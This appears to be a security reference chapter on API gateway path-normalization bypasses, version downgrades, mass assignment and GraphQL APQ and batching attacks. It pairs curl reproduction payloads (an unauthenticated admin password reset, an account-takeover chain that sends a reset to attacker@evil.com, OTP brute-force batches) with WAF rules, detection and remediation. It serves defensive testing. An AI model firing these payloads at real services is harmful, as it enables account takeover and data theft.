# 48 - API Gateway Path Normalization & API-Level Authentication Bypasses (2025-2026)

## Overview

API gateway path normalization bypasses, API version downgrade attacks, REST API mass assignment for privilege escalation, and GraphQL APQ registration bypasses. These findings exploit semantic gaps between how different layers (gateway, middleware, backend) interpret the same HTTP request, enabling authentication and authorization bypass without any credentials.

---

## 48.1 API Gateway Path Normalization Bypass

**Severity:** CRITICAL
**CVEs:** CVE-2025-66202, CVE-2025-71399, CVE-2026-33186
**Affected:** AWS HTTP API, Better Auth (<1.4.5), Astro (<5.15.8 / <6.3.2), MCP Python SDK, gRPC-Go

### Description

API gateways and reverse proxies that apply authentication checks before normalizing URL paths are vulnerable to bypass via double encoding, double slashes, dot segments, or trailing slashes. The gateway sees one path and the backend sees another after its own normalization/decoding pass. The core issue is a semantic gap: the gateway's path-matching logic and the backend's routing logic interpret the same URL differently due to differences in when and how they normalize paths.

### Real-World Cases

| Case | Technique | Impact | Bounty/CVE |
|------|-----------|--------|------------|
| AWS HTTP API | Trailing slash | Full auth bypass on fintech accounts API | $12,000 bounty |
| Better Auth | Double slash | Rate limit bypass on sign-in endpoint | CVE-2025-71399 |
| Astro Framework | Double encoding | Middleware bypass on protected routes | CVE-2025-66202 |
| MCP Python SDK | Dot segments | Resource access control bypass | GitHub issue #3303 |
| gRPC-Go | Path normalization | Auth bypass | CVE-2026-33186 |

### Reproduction Steps

#### Trailing Slash Bypass (AWS HTTP API Pattern - $12K Bounty)
```bash
# Baseline - protected endpoint returns 401:
curl -v https://api.target.com/v1/accounts
# HTTP/1.1 401 Unauthorized

# Bypass - same endpoint with trailing slash returns 200:
curl -v https://api.target.com/v1/accounts/
# HTTP/1.1 200 OK
# { "accounts": [...] }

# Test other protected endpoints:
curl -v https://api.target.com/v1/transfers/
curl -X POST https://api.target.com/v1/transfers/ \
  -d '{"amount":1000}' -H 'Content-Type: application/json'
```

**Root cause:** The AWS HTTP API authorizer matched the path `/v1/accounts` exactly but the route definition `/v1/accounts/` did not trigger the same authorizer context. The authorizer context was dropped during path normalization.

#### Double Encoding Bypass (Astro CVE-2025-66202)
```bash
# Baseline - blocked by middleware:
curl -v https://target.com/admin
# HTTP/1.1 403 Forbidden

# Single encoding - may be caught by first fix:
curl -v https://target.com/%61dmin
# 'a' encoded as %61

# Double encoding - bypasses single-decode fix:
curl -v https://target.com/%2561dmin
# %25 decodes to %, then %61 decodes to 'a' at backend

# Triple encoding (test iterative decode fix):
curl -v https://target.com/%252561dmin
```

**Root cause:** Astro's middleware checked the URL path after a single decode pass. The first fix (PR #16556 in v5.15.8) rejected double-encoded paths. A later change in v6.3.2 switched to iterative decoding instead.

#### Double Slash Bypass (Better Auth CVE-2025-71399)
```bash
# Baseline - path is disabled/rate-limited:
curl -v https://target.com/sign-in/email
# HTTP/1.1 429 Too Many Requests (rate limited)

# Double slash bypass:
curl -v https://target.com//sign-in/email
# HTTP/1.1 200 OK (bypassed rate limiting)

# Triple slash:
curl -v https://target.com///sign-in/email

# With different path segments:
curl -v https://target.com//api/auth/sign-in
```

**Root cause:** The rou3 router normalized double slashes to single slashes AFTER the path-matching/disabled-path check had already determined the path did not match the disabled pattern (because `//sign-in/email` != `/sign-in/email`). Fixed in Better Auth v1.4.5.

#### Dot Segment Traversal (MCP Python SDK)
```bash
# Baseline - /api/ prefix is allowed, /admin/ is not:
curl -v https://target.com/api/data    # 200 OK
curl -v https://target.com/admin/      # 403 Forbidden

# Dot segment bypass:
curl -v https://target.com/api/../admin/

# Encoded dot segments:
curl -v https://target.com/api/%2e%2e/admin/
curl -v https://target.com/api/..%2fadmin/

# Double-encoded dot segments:
curl -v https://target.com/api/%252e%252e/admin/
```

**Root cause:** `check_resource_allowed()` used `startswith('/api/')` without resolving dot segments or decoding percent-encoding before the prefix comparison. GitHub issue #3303.

#### Additional Normalization Techniques
```bash
# Semicolon path parameters (Tomcat):
curl -v https://target.com/admin;jsessionid=fake
# Tomcat strips everything after semicolon for routing

# Case manipulation:
curl -v https://target.com/Admin
curl -v https://target.com/ADMIN

# Null byte injection (older systems):
curl -v 'https://target.com/allowed%00/../admin'

# Backslash (Windows backends):
curl -v 'https://target.com/api\..\..\admin'

# Unicode normalization (full-width slash U+FF0F):
curl -v 'https://target.com/api%EF%BC%8F..%EF%BC%8Fadmin'
```

### Complete Bypass Techniques Matrix

| # | Technique | Example | Gateway Sees | Backend Sees | Severity |
|---|-----------|---------|-------------|-------------|----------|
| 1 | Trailing slash | `/v1/accounts/` | No route match (no auth) | `/v1/accounts` | Critical |
| 2 | Double encoding | `/%2561dmin` | `/%2561dmin` (unknown) | `/admin` | Critical |
| 3 | Triple encoding | `/%252561dmin` | `/%252561dmin` | `/admin` | Critical |
| 4 | Double slash | `//sign-in/email` | Not in disabled paths | `/sign-in/email` | High |
| 5 | Dot segments | `/api/../admin/` | Starts with `/api/` | `/admin/` | Critical |
| 6 | Encoded dots | `/api/%2e%2e/admin/` | Starts with `/api/` | `/admin/` | Critical |
| 7 | Mixed encoding | `/api/..%2fadmin/` | Starts with `/api/` | `/admin/` | Critical |
| 8 | Case manipulation | `/Admin` vs `/admin` | Case-sensitive miss | Case-insensitive match | High |
| 9 | Semicolon params | `/admin;foo=bar` | `/admin;foo=bar` | `/admin` | High |
| 10 | Backslash | `/api\..\..\admin` | Unknown path | `/admin` | High |
| 11 | Unicode normalization | Full-width chars | Non-matching | Normalized match | Medium |
| 12 | Null byte | `/allowed%00/../admin` | `/allowed%00/...` | `/admin` | Medium |

### Chaining Potential

1. **Authentication bypass** -- Accessing protected endpoints without any credentials (primary impact)
2. **Authorization bypass** -- Accessing endpoints restricted to higher privilege levels
3. **Rate limit evasion** -- Each path variant is a different rate limit key while routing to the same endpoint (documented in Better Auth advisory)
4. **WAF bypass** -- Double-encoded payloads pass through WAF rules that inspect the un-decoded path
5. **SSRF** -- Path traversal through reverse proxy to reach internal services (e.g., `/api/../../internal-service/admin`)
6. **Cache poisoning** -- Normalized and non-normalized paths may have different cache keys but serve the same content
7. **Log evasion** -- Encoded path in access logs may not be recognized as accessing a sensitive endpoint during incident review

### Detection

```bash
# Automated scanning tool
# Use cerberauth/proxyaudit for configuration-driven path normalization testing
proxyaudit scan --config gateway-config.yaml --target https://api.target.com

# WAF rules for encoded traversal
SecRule REQUEST_URI "@rx (%2e|%252e|%2f|%252f|%5c|%255c)" \
  "id:PATH_NORM_BYPASS,phase:1,deny,status:400,msg:'Encoded path traversal attempt'"

# Double-slash detection
SecRule REQUEST_URI "@rx //" \
  "id:DOUBLE_SLASH,phase:1,log,msg:'Double slash in request path'"
```

- Compare gateway access logs (raw paths) with backend access logs (decoded paths) -- mismatches indicate bypass attempts
- Alert on authorization decisions that differ between `/path` and `/path/`
- Log and compare the URL as seen by each processing layer
- Include normalization bypass payloads in CI/CD security tests

### Remediation

1. **Normalize paths BEFORE authentication decisions** -- Decode percent-encoding, resolve dot segments, collapse double slashes, strip or enforce trailing slash policy
2. **Ensure gateway and backend agree on canonical path form** -- Test with the same test vectors at both layers
3. **Upgrade affected components:**
   - Better Auth to 1.4.5+
   - Astro to latest (6.3.2+)
   - oauth2-proxy to 7.11.0+
4. **For AWS HTTP API:** Consider migrating to REST API for stricter path handling, or add explicit route definitions for path variants
5. **For MCP Python SDK:** Apply URL normalization (`urllib.parse.unquote` + `posixpath.normpath`) before prefix checks
6. **Implement path normalization at the outermost layer** (load balancer or CDN) before traffic reaches the gateway
7. **Add integration tests** that verify auth enforcement across all path encoding variants

### References

- https://feedbagel.com/post/i-bypassed-aws-api-gateway-auth-with-a-trailing-slash-got-12k-bounty
- https://www.infoq.com/news/2026/06/aws-api-gateway-auth-bypass/
- https://github.com/better-auth/better-auth/security/advisories/GHSA-x732-6j76-qmhm
- https://github.com/withastro/astro/pull/16556
- https://www.miggo.io/vulnerability-database/cve/CVE-2025-66202
- https://github.com/modelcontextprotocol/python-sdk/issues/3303
- https://www.raijuna.com/knowledge/path-normalization

---

## 48.2 API Version Downgrade Authentication Bypass

**Severity:** CRITICAL
**CVEs:** CVE-2026-23760, CVE-2025-13915
**Affected:** SmarterMail, IBM API Connect (10.0.8.0-10.0.8.5, 10.0.11.0)

### Description

When API teams add authentication to v2 while keeping v1 alive for backward compatibility, the older version becomes an unauthenticated backdoor. Auth middleware is typically registered per namespace or version prefix, so v1 routes can skip middleware added only to the v2 namespace. Classified as OWASP API9:2019 (Improper Assets Management) and OWASP API9:2023 (Improper Inventory Management).

**CVE-2026-23760** (SmarterMail, CVSS 9.8-10): The `ForceResetPassword` endpoint was marked `AllowAnonymous=true` and accepted a user-supplied `IsSysAdmin` flag that skipped existing-password validation, enabling unauthenticated admin password reset. Exploitation began January 17, 2026 (two days after patch). In CISA KEV catalog. Post-authentication, admin access to SmarterMail allows OS command execution escalating to SYSTEM/root.

**CVE-2025-13915** (IBM API Connect, CVSS 9.8): Critical authentication bypass in API management infrastructure itself, classified as CWE-305 (Authentication Bypass by Primary Weakness).

**Shadow API prevalence:** Organizations typically discover 30-60% more APIs than they knew about during first comprehensive discovery efforts.

### Reproduction Steps

#### Version Enumeration
```bash
# Discover available API versions
for v in v0 v1 v2 v3 beta internal legacy staging; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "https://target/api/$v/users")
  echo "$v: $code"
done

# Compare authentication requirements
curl -v https://target/api/v2/users  # expect 401
curl -v https://target/api/v1/users  # may return 200 with data

# Test each discovered endpoint for auth differences
for endpoint in users accounts settings admin; do
  echo "=== $endpoint ==="
  echo "v2: $(curl -s -o /dev/null -w '%{http_code}' https://target/api/v2/$endpoint)"
  echo "v1: $(curl -s -o /dev/null -w '%{http_code}' https://target/api/v1/$endpoint)"
done
```

#### CVE-2026-23760 (SmarterMail)
```bash
# Step 1 - Identify SmarterMail instance (default port 9998)
curl -v https://target:9998/

# Step 2 - Unauthenticated admin password reset
curl -X POST https://target/api/v1/auth/force-reset-password \
  -H 'Content-Type: application/json' \
  -d '{
    "emailAddress": "admin@target.com",
    "newPassword": "AttackerPass123!",
    "isSysAdmin": true
  }'

# Step 3 - Login with new password for admin access
# Step 4 - Use admin access for OS command execution (SYSTEM/root)
```

#### Version Discovery via Documentation and Client Code
```bash
# Check for API documentation endpoints
for path in swagger.json openapi.json api-docs docs/api; do
  for v in v1 v2 v3; do
    code=$(curl -s -o /dev/null -w '%{http_code}' "https://target/api/$v/$path")
    [ "$code" != "404" ] && echo "Found: /api/$v/$path ($code)"
  done
done

# Check version headers
curl -v https://target/api/users \
  -H 'X-API-Version: 1'
curl -v https://target/api/users \
  -H 'Accept: application/vnd.api.v1+json'
curl -v https://target/api/users?version=1
curl -v https://target/api/users?api-version=1
```

### Bypass Techniques

| Technique | Example | Mechanism |
|-----------|---------|-----------|
| Direct version substitution | `/api/v2/endpoint` -> `/api/v1/endpoint` | Older version lacks auth middleware |
| Version header manipulation | `X-API-Version: 1` or `Accept: application/vnd.api.v1+json` | Server routes to older handler |
| Query parameter version | `?version=1` or `?api-version=1` | Query overrides path version |
| Subdomain versioning | `v1.api.target.com` vs `v2.api.target.com` | Different subdomains, different middleware |
| Path case variations | `/API/V1/` or `/Api/v1/` | Case-insensitive routing bypasses case-sensitive middleware |
| Trailing slash differences | `/api/v1/users` vs `/api/v1/users/` | Different route resolution |

### Chaining Potential

1. **Complete account takeover** via password reset endpoints (CVE-2026-23760)
2. **OS command execution** when admin access is gained (SmarterMail admin to SYSTEM/root)
3. **Data exfiltration** through unauthenticated data-access endpoints
4. **Privilege escalation** when older versions lack RBAC controls
5. **Lateral movement** using credentials obtained from unprotected endpoints
6. **Gateway compromise** -- IBM API Connect CVE-2025-13915 affects the API management layer itself, meaning exploitation could compromise the gateway protecting all downstream APIs

### Detection

```bash
# Automated version enumeration and auth comparison script
#!/bin/bash
TARGET=$1
ENDPOINTS="users accounts settings admin auth/me"
VERSIONS="v0 v1 v2 v3 beta internal legacy"

for endpoint in $ENDPOINTS; do
  echo "=== /$endpoint ==="
  for v in $VERSIONS; do
    auth_code=$(curl -s -o /dev/null -w '%{http_code}' "$TARGET/api/$v/$endpoint")
    noauth_code=$(curl -s -o /dev/null -w '%{http_code}' \
      -H 'Authorization: ' "$TARGET/api/$v/$endpoint")
    [ "$auth_code" = "200" ] && echo "  $v: ACCESSIBLE (HTTP $auth_code)"
  done
done
```

- Maintain complete inventory of all deployed API versions
- Alert on requests to deprecated version paths
- Place honeypot endpoints at deprecated versions that trigger alerts on access
- Apply authentication middleware at the gateway level BEFORE version routing
- Monitor for traffic switching from v2 to v1 endpoints for the same resource

### Remediation

- Apply authentication middleware at the gateway level before version routing, not per-version
- Decommission old versions with explicit sunset dates and hard removal
- Use API gateways that enforce authentication uniformly across all version paths
- For SmarterMail: Patch immediately (in CISA KEV catalog, actively exploited)
- For IBM API Connect: Upgrade to patched versions

### References

- https://stack.watch/vuln/CVE-2026-23760/
- https://www.cyfirma.com/research/cve-2026-23760-smartertools-smartermail-authentication-bypass-vulnerability/
- https://socradar.io/blog/ibm-api-connect-auth-bypass-cve-2025-13915/

---

## 48.3 REST API Mass Assignment (Privilege Escalation)

**Severity:** CRITICAL (OWASP API3:2023)
**CVEs:** CVE-2025-15602, CVE-2025-20156
**Affected:** Snipe-IT (<8.3.7), Cisco Meeting Management

### Description

REST APIs that bind request body parameters directly to internal data models without explicit allowlisting are vulnerable to mass assignment. Attackers add unexpected fields (such as `role`, `is_admin`, `permissions`, `account_balance`) to otherwise legitimate requests, and the framework writes them to the database. This is invisible to transport-level security controls because payloads are ordinary-looking JSON. Classified as OWASP API3:2023 Broken Object Property Level Authorization (BOPLA).

**CVE-2025-20156** (Cisco Meeting Management, CVSS 9.9): Low-privileged authenticated users elevated to administrator via improper authorization enforcement.

**CVE-2025-15602** (Snipe-IT, CVSS 8.8): Authenticated low-privileged user crafts malicious API requests to modify restricted fields on other accounts including Super Admin, then performs account takeover via password reset flow.

### Reproduction Steps

#### Basic Mass Assignment
```bash
# Step 1 - Examine GET response for privileged fields
curl https://target/api/v1/users/me \
  -H 'Authorization: Bearer <token>'
# Response: {"name":"test","email":"test@test.com","role":"user","is_admin":false}

# Step 2 - Inject privileged fields in update request
curl -X PUT https://target/api/v1/users/me \
  -H 'Authorization: Bearer <token>' \
  -H 'Content-Type: application/json' \
  -d '{"name":"test","role":"admin","is_admin":true}'

# Step 3 - Verify privilege escalation
curl https://target/api/v1/users/me \
  -H 'Authorization: Bearer <token>'
# Check if role changed to admin
```

#### Nested Object Injection
```bash
# Nested field injection
curl -X PUT https://target/api/v1/users/me \
  -H 'Content-Type: application/json' \
  -d '{"name":"test","profile":{"role":{"name":"admin"}}}'
```

#### Parameter Pollution (Multi-Channel)
```bash
# JSON body + query string
curl -X PUT 'https://target/api/v1/users/me?role=admin' \
  -H 'Content-Type: application/json' \
  -d '{"name":"test"}'

# JSON body + form data
curl -X PUT https://target/api/v1/users/me \
  -H 'Content-Type: application/json' \
  -d '{"name":"test"}' \
  --data-urlencode 'role=admin'
```

#### Snipe-IT CVE-2025-15602 (Full Chain)
```bash
# Step 1 - As low-privileged user, modify Super Admin's email
curl -X PUT https://target/api/v1/users/1 \
  -H 'Authorization: Bearer <lowpriv_token>' \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@evil.com"}'

# Step 2 - Trigger password reset for modified account
curl -X POST https://target/password/email \
  -d 'email=attacker@evil.com'

# Step 3 - Complete reset and gain Super Admin access
```

#### Framework-Specific Exploitation
```bash
# Spring Boot - test @ModelAttribute or @RequestBody with JPA entities
curl -X POST https://target/api/users \
  -H 'Content-Type: application/json' \
  -d '{"username":"test","enabled":true,"accountNonLocked":true,
       "authorities":[{"authority":"ROLE_ADMIN"}]}'

# Rails - check for .permit! (allows all parameters)
# Grep controllers: grep -r '\.permit!' app/controllers/

# Django REST Framework - check serializer fields
curl -X PATCH https://target/api/users/me/ \
  -H 'Content-Type: application/json' \
  -d '{"is_staff":true,"is_superuser":true}'
```

#### Batch Endpoint Abuse
```bash
# Bulk update endpoints often have weaker field validation
curl -X POST https://target/api/v1/users/batch \
  -H 'Content-Type: application/json' \
  -d '{"users":[{"id":1,"role":"admin"},{"id":2,"role":"admin"}]}'
```

### Bypass Techniques

| Technique | Description | Target Framework |
|-----------|-------------|-----------------|
| Framework auto-binding | Constructor/setter binding traverses object graphs | Spring Boot |
| `.permit!` (bang variant) | Allows all parameters through strong_parameters | Ruby on Rails |
| Parameter pollution | JSON body + query string + form data channels | All |
| Nested object injection | `profile[role]` or `user.permissions[0]` | All ORMs |
| Case sensitivity | `Role` vs `role` vs `ROLE` | String-match allowlists |
| Batch endpoint abuse | Bulk update with weaker validation | REST APIs |
| Content-Type switching | JSON vs form-data with same fields | Express, Spring |

### Chaining Potential

1. **IDOR + Mass Assignment** -- Modify other users' accounts with elevated privileges
2. **Password reset chain** (CVE-2025-15602) -- Modify email, then reset password
3. **Rate limiting bypass + field enumeration** -- Discover writable fields across endpoints
4. **Information disclosure** -- Error messages or GraphQL introspection reveal internal field names

### Detection

```bash
# Code review grep patterns
# Rails:
grep -r '\.permit!' app/controllers/

# Spring Boot:
grep -r '@ModelAttribute' --include='*.java' | grep -i 'entity'

# Django:
grep -r 'serializer_class' --include='*.py' | xargs grep -L 'fields'

# Node.js/Mongoose:
grep -r 'findOneAndUpdate.*\$set.*req\.body' --include='*.js'
```

- Enforce strict JSON Schema validation at the API gateway with `additionalProperties: false`
- Log all fields received in write requests and alert on unexpected fields
- Submit requests with additional privileged fields in CI/CD tests and verify no effect

### Remediation

- Implement explicit allowlists for writable fields at every write endpoint
- Use DTOs (Data Transfer Objects) -- never bind request data directly to ORM entities
- In Rails: Use `params.require(:user).permit(:name, :email)` -- never `.permit!`
- In Spring: Use dedicated request DTOs, not `@ModelAttribute` on JPA entities
- In Django REST: Set `fields` explicitly on serializers, never use `__all__` for write operations
- Add `additionalProperties: false` to all JSON Schema definitions
- Implement automated tests that submit requests with injected privileged fields

### References

- https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/
- https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
- https://nvd.nist.gov/vuln/detail/CVE-2025-15602
- https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cmm-privesc-uy2Vf8pc

---

## 48.4 GraphQL APQ Registration Bypass

**Severity:** HIGH
**CVEs:** CVE-2025-32032, CVE-2026-35413
**Affected:** Apollo Router, Directus

### Description

Automatic Persisted Queries (APQ) registration is a write operation often not gated by the same allowlist that restricts query execution. An attacker registers arbitrary malicious queries (introspection, data exfiltration, mutations) by associating them with self-chosen hashes. The hash is client-controlled and the server trusts whatever document the client associates with it.

**CVE-2025-32032** (Apollo Router, CVSS 7.5): Queries with deeply nested reused named fragments exhaust the query planner's thread pool because no timeout is enforced, causing denial of service. Related advisory GHSA-84m6-5m72-45fp covers integer overflow bypassing configured operation limits.

**CVE-2026-35413** (Directus, CVSS 5.3): Disabling GraphQL introspection via `GRAPHQL_INTROSPECTION=false` blocked `__schema` and `__type` queries but NOT the `server_specs_graphql` SDL resolver on `/graphql/system`, leaking the full schema without authentication.

### Reproduction Steps

#### APQ Allowlist Bypass
```bash
# Step 1 - Send APQ request with unregistered hash
curl -X POST https://target/graphql \
  -H 'Content-Type: application/json' \
  -d '{
    "extensions": {
      "persistedQuery": {
        "version": 1,
        "sha256Hash": "attacker_controlled_hash_value"
      }
    }
  }'
# Returns: {"errors":[{"message":"PersistedQueryNotFound"}]}

# Step 2 - Register arbitrary malicious query (introspection)
curl -X POST https://target/graphql \
  -H 'Content-Type: application/json' \
  -d '{
    "query": "{__schema{types{name fields{name type{name}}}}}",
    "extensions": {
      "persistedQuery": {
        "version": 1,
        "sha256Hash": "attacker_controlled_hash_value"
      }
    }
  }'
# Server registers and caches the query

# Step 3 - Future requests with that hash execute the attacker's query
curl -X POST https://target/graphql \
  -H 'Content-Type: application/json' \
  -d '{
    "extensions": {
      "persistedQuery": {
        "version": 1,
        "sha256Hash": "attacker_controlled_hash_value"
      }
    }
  }'
# Returns full schema introspection result

# Step 4 - Register data exfiltration query
curl -X POST https://target/graphql \
  -H 'Content-Type: application/json' \
  -d '{
    "query": "{ users { id email passwordHash role } }",
    "extensions": {
      "persistedQuery": {
        "version": 1,
        "sha256Hash": "another_attacker_hash"
      }
    }
  }'

# Step 5 - Register mutation
curl -X POST https://target/graphql \
  -H 'Content-Type: application/json' \
  -d '{
    "query": "mutation { updateUser(id: \"1\", input: { role: ADMIN }) { id role } }",
    "extensions": {
      "persistedQuery": {
        "version": 1,
        "sha256Hash": "yet_another_hash"
      }
    }
  }'
```

#### CVE-2026-35413 (Directus SDL Leak)
```bash
# Bypass introspection=false by using the SDL resolver
curl -X POST https://target/graphql/system \
  -H 'Content-Type: application/json' \
  -d '{"query":"{server_specs_graphql}"}'
# Returns full SDL schema even when introspection is disabled
# Includes: collection names, field types, relationships
```

#### CVE-2025-32032 (Apollo Router DoS)
```bash
# Send queries with deeply nested named fragments
curl -X POST https://target/graphql \
  -H 'Content-Type: application/json' \
  -d '{
    "query": "query { ...A } fragment A on Query { ...B } fragment B on Query { ...C } fragment C on Query { ...D } fragment D on Query { ...E }"
  }'
# Continue nesting 50+ levels to exhaust query planner thread pool
```

### Bypass Techniques

| Technique | Description |
|-----------|-------------|
| APQ cache registration | Register arbitrary queries under self-chosen hashes |
| Hash manipulation | Client-controlled hash without server-side verification |
| Cache poisoning | Associate malicious query with hash of legitimate query |
| SDL resolver access | Query `server_specs_graphql` when introspection is disabled |
| Error-based schema reconstruction | InQL v6.1+ reconstructs schemas from error messages |

### Chaining Potential

1. **APQ bypass -> introspection** -- Discover full schema when it's supposed to be hidden
2. **Schema -> targeted data exfiltration** -- Use discovered field names for targeted queries
3. **APQ -> mutation execution** -- Modify data through allowlisted-bypass queries
4. **APQ -> DoS** (CVE-2025-32032) -- Resource-exhausting queries via nested fragments
5. **Schema disclosure -> injection attacks** -- Informed by schema knowledge
6. **Schema -> business logic abuse** -- Discovered relationships and collection names

### Detection

```bash
# WAF Rules
# Block requests to /graphql/system from unauthenticated sources
SecRule REQUEST_URI "@contains /graphql/system" \
  "chain,id:GQL_SYSTEM,phase:1"
  SecRule &REQUEST_HEADERS:Authorization "@eq 0" \
    "deny,status:403,msg:'Unauthenticated graphql/system access'"

# Alert on requests containing server_specs_graphql
SecRule REQUEST_BODY "@contains server_specs_graphql" \
  "id:GQL_SDL_LEAK,phase:2,log,msg:'Potential SDL schema leak attempt'"

# Monitor for APQ registration from unexpected sources
# Alert on unusually deep fragment nesting in query bodies
```

- Use strict persisted query mode rejecting any query not pre-registered during build/deploy
- Validate APQ registration requires authentication and authorization
- Verify hash integrity by computing SHA-256 of submitted document and comparing against claimed hash
- Set query planning timeouts and monitor thread pool utilization (CVE-2025-32032)
- Ensure introspection controls cover ALL schema-disclosure endpoints including SDL resolvers

### Remediation

- Use strict persisted query mode that rejects unregistered queries at runtime
- Validate hash integrity: compute SHA-256 of submitted document and compare against claimed hash
- Gate APQ registration behind authentication
- Block `/graphql/system` from unauthenticated sources
- Set query planning timeouts (Apollo Router)
- Cap batch size at 3-5 queries
- Implement query cost analysis with field weights multiplied by list cardinality

### Tools

| Tool | Purpose | Source |
|------|---------|--------|
| InQL v6.1+ | Schema reconstruction from error messages | github.com/doyensec/inql |
| graphql-cop | APQ and batching misconfiguration detection | github.com/dolevf/graphql-cop |
| BatchQL | GraphQL batching attack automation | github.com/assetnote/batchql |

### References

- https://github.com/apollographql/router/security/advisories/GHSA-84m6-5m72-45fp
- https://app.opencve.io/cve/CVE-2026-35413
- https://vulners.com/rapid7/RAPID7:CVE-2025-32032

---

## 48.5 GraphQL Alias Batching for Rate Limit Bypass and Brute Force

**Severity:** HIGH
**Affected:** Any GraphQL endpoint with HTTP-level rate limiting

### Description

GraphQL's alias feature allows a single HTTP request to contain thousands of operations targeting the same resolver with different arguments. Rate limiters that count HTTP requests see one request while the server processes thousands of authentication attempts. Two batching forms exist: (1) Alias batching packs many aliased copies of one field into a single operation. (2) Array batching sends a JSON array of separate operations in one HTTP body. Combined (N array elements x M aliases each), this produces N*M resolver executions per HTTP request.

### Reproduction Steps

#### Alias-Based OTP Brute Force (Single Request)
```bash
curl -X POST https://target/graphql \
  -H 'Content-Type: application/json' \
  -d '{
    "query": "mutation {
      a0: verifyOTP(code:\"0000\"){success}
      a1: verifyOTP(code:\"0001\"){success}
      a2: verifyOTP(code:\"0002\"){success}
      a3: verifyOTP(code:\"0003\"){success}
      ...
      a9999: verifyOTP(code:\"9999\"){success}
    }"
  }'
# Parse response for the alias that returned success:true
```

#### Array Batching (Multiple Queries)
```bash
curl -X POST https://target/graphql \
  -H 'Content-Type: application/json' \
  -d '[
    {"query":"mutation{login(user:\"admin\",pass:\"password1\"){token}}"},
    {"query":"mutation{login(user:\"admin\",pass:\"password2\"){token}}"},
    {"query":"mutation{login(user:\"admin\",pass:\"password3\"){token}}"}
  ]'
```

#### Combined N*M Amplification
```bash
# Array batching (N=100 operations) x alias batching (M=100 aliases each)
# = 10,000 authentication attempts in a single HTTP request
# All invisible to per-request rate limiting
```

### Detection and Prevention

- Implement query cost analysis with field weights multiplied by list cardinality
- Count each aliased operation toward rate limits (not just HTTP requests)
- Cap batch size at 3-5 queries
- WAF: Block request bodies over 64KB
- Alert on requests containing multiple field aliases (pattern: `a0:`, `a1:`, `a2:`)
- Log query signatures (operation name + normalized document hash)

### References

- https://lab.wallarm.com/graphql-batching-attack/
- https://escape.tech/blog/graphql-batch-attacks-cause-dos/

---

## 48.6 API-Level Security Controls Matrix

### Path Normalization Controls

| Attack | Detection | Prevention |
|--------|-----------|------------|
| Trailing slash bypass | Alert on auth differences between /path and /path/ | Normalize before auth; explicit route definitions |
| Double encoding | WAF rules for %25xx patterns | Iterative decoding before auth |
| Double slash | Alert on // in URL paths | Collapse slashes at outermost layer |
| Dot segments | WAF rules for %2e%2e patterns | Resolve dot segments before auth |
| Semicolon params | Alert on ; in URL paths | Strip path parameters at gateway |
| Case manipulation | Compare case-normalized paths | Consistent case handling across layers |

### API-Level Controls

| Attack | Detection | Prevention |
|--------|-----------|------------|
| Version downgrade | Monitor traffic to deprecated API paths | Apply auth at gateway before version routing |
| Mass assignment | Log unexpected fields in write requests | `additionalProperties: false` in JSON Schema |
| GraphQL APQ bypass | Monitor APQ cache registrations | Strict persisted query mode; hash verification |
| GraphQL batching | Alert on >N aliases per request | Query cost analysis; per-operation rate limits |
| GraphQL SDL leak | Monitor /graphql/system access | Block unauthenticated SDL resolver access |

---

## 48.7 Comprehensive WAF Rule Set

```
# Path Normalization Bypass Detection
SecRule REQUEST_URI "@rx (%2e|%252e|%2f|%252f|%5c|%255c)" \
  "id:2001,phase:1,deny,status:400,msg:'Encoded path traversal attempt'"

# Double Slash Detection
SecRule REQUEST_URI "@rx ^[^?]*//[^/]" \
  "id:2002,phase:1,log,msg:'Double slash in request path - potential normalization bypass'"

# Trailing Slash Auth Variance (log for investigation)
SecRule REQUEST_URI "@rx /api/v[0-9]+/[a-z]+/$" \
  "id:2003,phase:1,log,msg:'API request with trailing slash - verify auth consistency'"

# API Version Downgrade Detection
SecRule REQUEST_URI "@rx /api/(v0|v1|beta|internal|legacy|staging)/" \
  "id:2004,phase:1,log,msg:'Request to deprecated/internal API version'"

# Mass Assignment - Privileged Fields in Request Body
SecRule REQUEST_BODY "@rx \"(is_admin|role|permissions|is_superuser|is_staff|authorities)\"" \
  "id:2005,phase:2,log,msg:'Potential mass assignment - privileged field in request body'"

# GraphQL Alias Batching
SecRule REQUEST_BODY "@rx [a-z]+[0-9]{2,}:" \
  "id:2006,phase:2,log,msg:'Potential GraphQL alias batching attack'"

# GraphQL SDL Leak Prevention
SecRule REQUEST_BODY "@contains server_specs_graphql" \
  "id:2007,phase:2,deny,status:403,msg:'GraphQL SDL leak attempt blocked'"

# GraphQL Batch Size Limit
SecRule REQUEST_BODY "@rx ^\[.*\]$" \
  "chain,id:2008,phase:2"
  SecRule &TX:0 "@gt 5" \
    "deny,status:429,msg:'GraphQL batch size exceeded'"

# Semicolon Path Parameter Detection
SecRule REQUEST_URI "@rx ;[a-zA-Z]+=?" \
  "id:2009,phase:1,log,msg:'Semicolon path parameter detected - potential Tomcat bypass'"
```

---

## 48.8 CVE Reference Index

| CVE | Component | Category | Severity | Fixed Version |
|-----|-----------|----------|----------|---------------|
| CVE-2025-66202 | Astro Framework | Double encoding path bypass | Critical | 5.15.8+ / 6.3.2+ |
| CVE-2025-71399 | Better Auth | Double slash bypass | High | 1.4.5+ |
| CVE-2026-33186 | gRPC-Go | Path normalization | High | Patched |
| CVE-2026-23760 | SmarterMail | Version downgrade auth bypass | Critical (9.8-10) | Patched (CISA KEV) |
| CVE-2025-13915 | IBM API Connect | Authentication bypass | Critical (9.8) | 10.0.8.6+ |
| CVE-2025-15602 | Snipe-IT | Mass assignment privilege escalation | High (8.8) | 8.3.7+ |
| CVE-2025-20156 | Cisco Meeting Management | REST API privilege escalation | Critical (9.9) | Patched |
| CVE-2025-32032 | Apollo Router | Named fragment DoS | High (7.5) | Patched |
| CVE-2026-35413 | Directus | SDL schema leak | Medium (5.3) | Patched |

---

## 48.9 Testing Methodology

### Path Normalization Testing Checklist

```
For each protected endpoint (/admin, /api/users, /internal, etc.):
  [ ] Test trailing slash variant (/admin/)
  [ ] Test double slash (//admin)
  [ ] Test triple slash (///admin)
  [ ] Test single-encoded path (%61dmin)
  [ ] Test double-encoded path (%2561dmin)
  [ ] Test dot segment traversal (/allowed/../admin)
  [ ] Test encoded dot segments (/allowed/%2e%2e/admin)
  [ ] Test mixed encoding (/allowed/..%2fadmin)
  [ ] Test case variations (/Admin, /ADMIN)
